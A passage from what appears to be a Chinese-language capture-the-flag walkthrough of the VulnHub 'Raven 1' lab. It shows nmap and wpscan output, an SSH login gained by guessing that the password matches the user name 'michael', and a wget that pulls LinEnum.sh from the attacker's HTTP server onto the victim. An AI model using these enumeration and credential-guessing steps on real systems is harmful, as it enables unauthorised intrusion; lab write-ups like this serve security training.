class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|          // form submit event</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Line number: 90</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- Start about-top Area --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Line number: 167</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- Start fact Area --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Line number: 111</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- Start service Area --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/css/main.css</span></span><br><span class="line"><span class="string">|     Line number: 3306</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         /*</span></span><br><span class="line"><span class="string">|         ################</span></span><br><span class="line"><span class="string">|                        Start Blog Details  Page style</span></span><br><span class="line"><span class="string">|         ################</span></span><br><span class="line"><span class="string">|         */</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/contact.php</span></span><br><span class="line"><span class="string">|     Line number: 89</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- Start contact-page Area --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/css/main.css</span></span><br><span class="line"><span class="string">|     Line number: 3301</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         /*</span></span><br><span class="line"><span class="string">|         ################</span></span><br><span class="line"><span class="string">|                        End Blog Home  Page style</span></span><br><span class="line"><span class="string">|         ################</span></span><br><span class="line"><span class="string">|         */</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/css/owl.carousel.css</span></span><br><span class="line"><span class="string">|     Line number: 1</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         </span></span><br><span class="line"><span class="string">|         </span></span><br><span class="line"><span class="string">|         </span></span><br><span class="line"><span class="string">|         </span></span><br><span class="line"><span class="string">|          */</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/js/mail-script.js</span></span><br><span class="line"><span class="string">|     Line number: 4</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|          // contact form</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Line number: 8</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- Author Meta --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Line number: 267</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- End team Area --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/wordpress/</span></span><br><span class="line"><span class="string">|     Line number: 74</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- .wrap --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/css/main.css</span></span><br><span class="line"><span class="string">|     Line number: 2046</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         /* Nav Meu Container */</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Line number: 165</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- End service Area --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/css/main.css</span></span><br><span class="line"><span class="string">|     Line number: 5</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         /* Wide Mobile Layout: 480px */</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/js/mail-script.js</span></span><br><span class="line"><span class="string">|     Line number: 5</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|          // submit button</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Line number: 318</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- End footer Area --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/js/jquery.sticky.js</span></span><br><span class="line"><span class="string">|     Line number: 2</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         </span></span><br><span class="line"><span class="string">|         // =============</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Line number: 110</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- End about-top Area --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Line number: 194</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- end fact Area --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/js/mail-script.js</span></span><br><span class="line"><span class="string">|     Line number: 1</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|          // -------   Mail Send ajax</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/js/jquery.sticky.js</span></span><br><span class="line"><span class="string">|     Line number: 10</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         </span></span><br><span class="line"><span class="string">|         //       It will only set the &#x27;</span>top<span class="string">&#x27; and &#x27;</span>position<span class="string">&#x27; of your element, you</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/css/main.css</span></span><br><span class="line"><span class="string">|     Line number: 3065</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         /*</span></span><br><span class="line"><span class="string">|         ################</span></span><br><span class="line"><span class="string">|                        Start Blog Home  Page style</span></span><br><span class="line"><span class="string">|         ################</span></span><br><span class="line"><span class="string">|         */</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/css/bootstrap.css</span></span><br><span class="line"><span class="string">|     Line number: 1</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         /*!</span></span><br><span class="line"><span class="string">|          * Bootstrap v4.0.0-beta (https://getbootstrap.com)</span></span><br><span class="line"><span class="string">|          * Copyright 2011-2017 The Bootstrap Authors</span></span><br><span class="line"><span class="string">|          * Copyright 2011-2017 Twitter, Inc.</span></span><br><span class="line"><span class="string">|          * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)</span></span><br><span class="line"><span class="string">|          */</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/index.html</span></span><br><span class="line"><span class="string">|     Line number: 293</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- Start blog Area --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/css/main.css</span></span><br><span class="line"><span class="string">|     Line number: 1875</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         /*--------------------------------------------------------------</span></span><br><span class="line"><span class="string">|         # Header</span></span><br><span class="line"><span class="string">|         --------------------------------------------------------------*/</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/css/main.css</span></span><br><span class="line"><span class="string">|     Line number: 2130</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         /* Mobile Nav Styling */</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Line number: 6</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- Favicon--&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/js/mail-script.js</span></span><br><span class="line"><span class="string">|     Line number: 6</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|          // alert div for show alert message</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/css/main.css</span></span><br><span class="line"><span class="string">|     Line number: 1986</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         /*--------------------------------------------------------------</span></span><br><span class="line"><span class="string">|         # Navigation Menu</span></span><br><span class="line"><span class="string">|         --------------------------------------------------------------*/</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Line number: 71</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- #header --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Line number: 88</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- End banner Area --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/js/mail-script.js</span></span><br><span class="line"><span class="string">|     Line number: 24</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|          // reset submit button text</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/index.html</span></span><br><span class="line"><span class="string">|     Line number: 241</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|_        &lt;!-- Start galery Area --&gt;</span></span><br><span class="line"><span class="string">| http-csrf: </span></span><br><span class="line"><span class="string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.118</span></span><br><span class="line"><span class="string">|   Found the following possible CSRF vulnerabilities: </span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/</span></span><br><span class="line"><span class="string">|     Form id: </span></span><br><span class="line"><span class="string">|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&amp;id=92a4423d01</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/contact.php</span></span><br><span class="line"><span class="string">|     Form id: myform</span></span><br><span class="line"><span class="string">|     Form action: </span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/contact.php</span></span><br><span class="line"><span class="string">|     Form id: </span></span><br><span class="line"><span class="string">|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&amp;id=92a4423d01</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/team.html</span></span><br><span class="line"><span class="string">|     Form id: </span></span><br><span class="line"><span class="string">|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&amp;id=92a4423d01</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/index.html</span></span><br><span class="line"><span class="string">|     Form id: </span></span><br><span class="line"><span class="string">|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&amp;id=92a4423d01</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Form id: </span></span><br><span class="line"><span class="string">|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&amp;id=92a4423d01</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/wordpress/</span></span><br><span class="line"><span class="string">|     Form id: search-form-5e446a40901ba</span></span><br><span class="line"><span class="string">|_    Form action: http://raven.local/wordpress/</span></span><br><span class="line"><span class="string">|_http-date: Wed, 12 Feb 2020 21:12:24 GMT; +8h00m00s from local time.</span></span><br><span class="line"><span class="string">|_http-devframework: Couldn&#x27;</span>t determine the underlying framework or CMS. Try increasing <span class="string">&#x27;httpspider.maxpagecount&#x27;</span> value to spider more pages.</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">| http-enum: </span></span><br><span class="line"><span class="string">|   /wordpress/: Blog</span></span><br><span class="line"><span class="string">|   /wordpress/wp-login.php: Wordpress login page.</span></span><br><span class="line"><span class="string">|   /css/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.10 (debian)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /img/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.10 (debian)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /js/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.10 (debian)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /manual/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_  /vendor/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.10 (debian)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">| http-errors: </span></span><br><span class="line"><span class="string">| Spidering limited to: maxpagecount=40; withinhost=192.168.56.118</span></span><br><span class="line"><span class="string">|   Found the following error pages: </span></span><br><span class="line"><span class="string">|   </span></span><br><span class="line"><span class="string">|   Error Code: 404</span></span><br><span class="line"><span class="string">|       http://192.168.56.118:80/blog-single.html</span></span><br><span class="line"><span class="string">|   </span></span><br><span class="line"><span class="string">|   Error Code: 404</span></span><br><span class="line"><span class="string">|       http://192.168.56.118:80/contact.html</span></span><br><span class="line"><span class="string">|   </span></span><br><span class="line"><span class="string">|   Error Code: 404</span></span><br><span class="line"><span class="string">|_      http://192.168.56.118:80/wordpress/%5c%22</span></span><br><span class="line"><span class="string">|_http-feed: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">|_http-fetch: Please enter the complete path of the directory to save data in.</span></span><br><span class="line"><span class="string">| http-grep: </span></span><br><span class="line"><span class="string">|   (1) http://192.168.56.118:80/contact.php: </span></span><br><span class="line"><span class="string">|     (1) email: </span></span><br><span class="line"><span class="string">|       + support@codethemes.com</span></span><br><span class="line"><span class="string">|   (1) http://192.168.56.118:80/blog-single.html: </span></span><br><span class="line"><span class="string">|     (1) ip: </span></span><br><span class="line"><span class="string">|_      + 192.168.56.118</span></span><br><span class="line"><span class="string">| http-headers: </span></span><br><span class="line"><span class="string">|   Date: Wed, 12 Feb 2020 21:12:23 GMT</span></span><br><span class="line"><span class="string">|   Server: Apache/2.4.10 (Debian)</span></span><br><span class="line"><span class="string">|   Last-Modified: Sun, 12 Aug 2018 22:29:32 GMT</span></span><br><span class="line"><span class="string">|   ETag: &quot;41b3-5734482bdcb00&quot;</span></span><br><span class="line"><span class="string">|   Accept-Ranges: bytes</span></span><br><span class="line"><span class="string">|   Content-Length: 16819</span></span><br><span class="line"><span class="string">|   Vary: Accept-Encoding</span></span><br><span class="line"><span class="string">|   Connection: close</span></span><br><span class="line"><span class="string">|   Content-Type: text/html</span></span><br><span class="line"><span class="string">|   </span></span><br><span class="line"><span class="string">|_  (Request type: HEAD)</span></span><br><span class="line"><span class="string">|_http-malware-host: Host appears to be clean</span></span><br><span class="line"><span class="string">| http-methods: </span></span><br><span class="line"><span class="string">|_  Supported Methods: GET HEAD POST OPTIONS</span></span><br><span class="line"><span class="string">|_http-mobileversion-checker: No mobile version detected.</span></span><br><span class="line"><span class="string">| http-referer-checker: </span></span><br><span class="line"><span class="string">| Spidering limited to: maxpagecount=30</span></span><br><span class="line"><span class="string">|_  https://cdnjs.cloudflare.com:443/ajax/libs/popper.js/1.12.9/umd/popper.min.js</span></span><br><span class="line"><span class="string">|_http-security-headers: </span></span><br><span class="line"><span class="string">| http-sitemap-generator: </span></span><br><span class="line"><span class="string">|   Directory structure:</span></span><br><span class="line"><span class="string">|     /</span></span><br><span class="line"><span class="string">|       Other: 1; html: 1</span></span><br><span class="line"><span class="string">|     /css/</span></span><br><span class="line"><span class="string">|       css: 6</span></span><br><span class="line"><span class="string">|     /img/</span></span><br><span class="line"><span class="string">|       jpg: 4; png: 1</span></span><br><span class="line"><span class="string">|     /js/</span></span><br><span class="line"><span class="string">|       js: 5</span></span><br><span class="line"><span class="string">|     /wordpress/</span></span><br><span class="line"><span class="string">|       Other: 1</span></span><br><span class="line"><span class="string">|   Longest directory structure:</span></span><br><span class="line"><span class="string">|     Depth: 1</span></span><br><span class="line"><span class="string">|     Dir: /css/</span></span><br><span class="line"><span class="string">|   Total files found (by extension):</span></span><br><span class="line"><span class="string">|_    Other: 2; css: 6; html: 1; jpg: 4; js: 5; png: 1</span></span><br><span class="line"><span class="string">|_http-slowloris: false</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-title: Raven Security</span><br><span class="line">| http-traceroute: </span><br><span class="line">|_  Possible reverse proxy detected.</span><br><span class="line">| http-useragent-tester: </span><br><span class="line">|   Status <span class="keyword">for</span> browser useragent: 200</span><br><span class="line">|   Allowed User Agents: </span><br><span class="line">|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)</span><br><span class="line">|     libwww</span><br><span class="line">|     lwp-trivial</span><br><span class="line">|     libcurl-agent/1.0</span><br><span class="line">|     PHP/</span><br><span class="line">|     Python-urllib/2.5</span><br><span class="line">|     GT::WWW</span><br><span class="line">|     Snoopy</span><br><span class="line">|     MFC_Tear_Sample</span><br><span class="line">|     HTTP::Lite</span><br><span class="line">|     PHPCrawl</span><br><span class="line">|     URI::Fetch</span><br><span class="line">|     Zend_Http_Client</span><br><span class="line">|     http client</span><br><span class="line">|     PECL::HTTP</span><br><span class="line">|     Wget/1.13.4 (linux-gnu)</span><br><span class="line">|_    WWW-Mechanize/1.34</span><br><span class="line">| http-vhosts: </span><br><span class="line">| 126 names had status 200</span><br><span class="line">|_ftp0</span><br><span class="line">|_http-xssed: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          36286/tcp   status</span><br><span class="line">|   100024  1          43516/udp   status</span><br><span class="line">|   100024  1          46344/udp6  status</span><br><span class="line">|_  100024  1          56752/tcp6  status</span><br><span class="line">36286/tcp open  status  1 (RPC <span class="comment">#100024)</span></span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br></pre></td></tr></table></figure>

<p>将攻击机的hosts文件中添加</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.56.118 raven.local</span><br></pre></td></tr></table></figure>

<p>访问下面的url发现该站点是wordpress搭建的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.118/wordpress/</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub211.jpg"></p>
<p>因此，想到的第一个想法是运行wpscan并查看该扫描所枚举的内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/raven1<span class="comment"># wpscan --url http://192.168.56.118/wordpress/ --wp-content-dir -ep -et -eu</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.7.6</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] It seems like you have not updated the database for some time.</span></span><br><span class="line"><span class="string">[?] Do you want to update now? [Y]es [N]o, default: [N]n</span></span><br><span class="line"><span class="string">[+] URL: http://192.168.56.118/wordpress/</span></span><br><span class="line"><span class="string">[+] Started: Fri Feb 14 04:34:24 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.118/wordpress/</span></span><br><span class="line"><span class="string"> | Interesting Entry: Server: Apache/2.4.10 (Debian)</span></span><br><span class="line"><span class="string"> | Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.118/wordpress/xmlrpc.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.118/wordpress/readme.html</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.118/wordpress/wp-cron.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 60%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"><span class="string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 4.8.7 identified (Insecure, released on 2018-07-05).</span></span><br><span class="line"><span class="string"> | Found By: Emoji Settings (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.118/wordpress/, Match: &#x27;</span>wp-includes\/js\/wp-emoji-release.min.js?ver=4.8.7<span class="string">&#x27;</span></span><br><span class="line"><span class="string"> | Confirmed By: Meta Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.118/wordpress/, Match: &#x27;</span>WordPress 4.8.7<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] The main theme could not be detected.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Users (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Brute Forcing Author IDs - Time: 00:00:00 &lt;=============================================&gt; (10 / 10) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] User(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] michael</span></span><br><span class="line"><span class="string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] steven</span></span><br><span class="line"><span class="string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span></span><br></pre></td></tr></table></figure>

<p>结果返回了在受害人机器上创建的2位用户：</p>
<p>Michael and Steven</p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>继续在同一端口上进行操作,尝试使用端口22（SSH）。将用户名和密码也使用相同的单词是一种非常合乎逻辑的“尝试”方法。使用“michael”作为用户名和密码登录到SSH并成功进入Shell！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh michael@192.168.56.118</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.56.118 (192.168.56.118)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:rCGKSPq0sUfa5mqn/8/M0T63OxqkEIR39pi835oSDo8.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.56.118<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/root/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">michael@192.168.56.118&#x27;</span>s password: </span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">You have new mail.</span><br><span class="line">michael@Raven:~$ id</span><br><span class="line">uid=1000(michael) gid=1000(michael) groups=1000(michael),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)</span><br><span class="line">michael@Raven:~$ whoami</span><br><span class="line">michael</span><br></pre></td></tr></table></figure>

<p>然后，将目录更改为/tmp并导入了LinEnum.sh，该脚本用于枚举许多基本和高级Linux详细信息。它托管在本地计算机上的文件夹中，并使用wget命令导入到受害者计算机中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br><span class="line">192.168.56.1 - - [14/Feb/2020 04:45:37] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.1 - - [14/Feb/2020 04:45:41] <span class="string">&quot;GET /LinEnum.sh HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.118 - - [14/Feb/2020 04:46:02] <span class="string">&quot;GET /LinEnum.sh HTTP/1.1&quot;</span> 200 -</span><br><span class="line"></span><br><span class="line">michael@Raven:/tmp$ wget 192.168.56.102:8000/LinEnum.sh</span><br><span class="line">--2020-02-15 04:46:01--  http://192.168.56.102:8000/LinEnum.sh</span><br><span class="line">Connecting to 192.168.56.102:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 46476 (45K) [text/x-sh]</span><br><span class="line">Saving to: ‘LinEnum.sh’</span><br><span class="line"></span><br><span class="line">LinEnum.sh                     100%[=====================================================&gt;]  45.39K  --.-KB/s   <span class="keyword">in</span> 0s     </span><br><span class="line"></span><br><span class="line">2020-02-15 04:46:01 (470 MB/s) - ‘LinEnum.sh’ saved [46476/46476]</span><br><span class="line"></span><br><span class="line">michael@Raven:/tmp$ chmod 777 *</span><br><span class="line">michael@Raven:/tmp$ ls</span><br><span class="line">LinEnum.sh</span><br><span class="line">michael@Raven:/tmp$ ls -la</span><br><span class="line">total 76</span><br><span class="line">drwxrwxrwt  7 root    root     4096 Feb 15 04:46 